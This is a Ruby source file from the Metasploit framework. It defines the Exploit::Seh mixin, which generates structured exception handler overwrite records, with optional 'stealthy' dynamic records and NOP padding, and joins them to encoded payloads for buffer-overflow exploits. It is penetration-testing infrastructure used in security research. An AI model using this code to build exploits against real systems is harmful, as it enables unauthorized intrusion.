# -*- coding: binary -*-
require 'rex/exploitation/seh'

module Msf

###
#
# This mixin provides an interface to generating SEH registration records in a
# robust fashion using the Rex::Exploitation::Seh class.
#
###
module Exploit::Seh

  #
  # Creates an instance of an exploit that uses an SEH overwrite.
  #
  def initialize(info = {})
    super

    # Register an advanced option that allows users to specify whether or
    # not a dynamic SEH record should be used.
    register_advanced_options(
      [
        OptBool.new('DynamicSehRecord', [ false, "Generate a dynamic SEH record (more stealthy)", false ])
      ], Msf::Exploit::Seh)
  end

  #
  # Generates an SEH record with zero or more options.  The supported options
  # are:
  #
  #   NopGenerator
  #
  #     The NOP generator instance to use, if any.
  #
  #   Space
  #
  #     The amount of room the SEH record generator has to play with for
  #     random padding.  This should be derived from the maximum amount of
  #     space available to the exploit for payloads minus the current payload
  #     size.
  #
  def generate_seh_record(handler, opts = {})
    seh = Rex::Exploitation::Seh.new(
        payload_badchars,
        opts['Space'] || payload_space,
        opts['NopGenerator'] || nop_generator)

    # Generate the record
    seh.generate_seh_record(handler, datastore['DynamicSehRecord'])
  end

  def generate_seh_payload(handler, opts = {})

    # The boilerplate this replaces always has 8 bytes for seh + addr
    seh_space = 8 + payload.nop_sled_size

    seh = Rex::Exploitation::Seh.new(
        payload_badchars,
        seh_space,
        opts['NopGenerator'] || nop_generator)

    # Generate the record
    rec = seh.generate_seh_record(handler, datastore['DynamicSehRecord'])

    # Append the payload, minus the nop sled that we replaced
    rec << payload.encoded.slice(payload.nop_sled_size, payload.encoded.length)
  end

end

end
